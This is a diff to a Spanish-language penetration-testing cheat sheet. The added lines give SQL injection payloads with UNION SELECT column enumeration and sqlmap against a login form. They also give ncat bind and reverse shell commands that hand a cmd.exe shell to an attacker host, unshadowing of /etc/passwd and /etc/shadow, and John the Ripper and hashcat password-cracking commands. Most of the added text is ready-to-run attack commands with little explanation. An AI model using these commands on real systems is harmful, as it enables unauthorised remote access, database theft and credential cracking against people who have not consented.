@@ -185,7 +185,13 @@ Necesitamos un código SQL dinámico, por ejemplo:
  También se puede hacer utilizando UNION SELECT:
  
     select * from accounts where ID='' UNION SELECT username,pass from accounts where 'a'='a';
-  
+    
+ Para conocer el número de columnas en la base de datos:
+ 
+    =?id=test' UNION SELECT 'els1','els2';-- -
+ 
+ Vamos añadiendo 'els3','els3'...hasta que no nos salga un error. Así sabremos el número de columnas.
+ 
 ## SQLMAP
 
     sqlmap -u url 
@@ -222,4 +228,61 @@ consiguiendo os shell:
            
  Si tenemos que lanzarlo contra un login form (login.php)
  
-      sqlmap -u url --data='user=a&pass=b' -p user --technique=B(oolean)
+    sqlmap -u url --data='user=a&pass=b' -p user --technique=B(oolean)
+      
+## Backdoor
+
+ ###### ncat
+ 
+ Máquina víctima:
+ 
+    ncat -l(istener) -p(ort) 5555 -e(xecute) cmd.exe
+     
+ Máquina ataque:
+ 
+    ncat IP port
+     
+ Reverse connection ncat:
+ 
+ Ataque:
+ 
+    ncat -l -p 5555 -v
+    
+ Víctima:
+
+    ncat -e cmd.exe IP port
+    
+## John the ripper
+
+<img src="https://user-images.githubusercontent.com/111526713/189479694-c473d41b-bb36-48f6-b3dd-437150e3631c.png" width="350" />
+
+    john --list=format
+   
+ John necesita usuarios y hashes en el mismo fichero para crackearlos, para ello:
+ 
+    /etc/passwd
+    /etc/shadow
+ 
+    unshadow passwd shadow > crackme
+    
+ Ataques bruteforce y de diccionario:
+    
+    john --list=formats
+    john -incremental -users:<users list> <file to crack>       # para crackear sólo algunos usuarios de algún fichero como /etc/shadow   
+    john --show crackme     # Muestra los passwords crackeados del fichero crackme
+    john -wordlist=<wordlist> <file to crack>
+    john -wordlist=<wordlist> -rules <file to crack>        # reglas utilizadas para crackear palabras como cat con difernetes combinaciones como c@t,caT,CAT,CaT
+   
+   
+ ## Hashcat
+ 
+    hashcat64.exe -m 0 -a(ttack) 0 -D2 example.hash example.dict (-r rules)
+   
+  -m = seleccionamos el tipo de hash a crackear
+  -a = seleccionamos el tipo de ataque (0 = ataque de diccionario)
+  
+ 
+   
+    
+    
+    
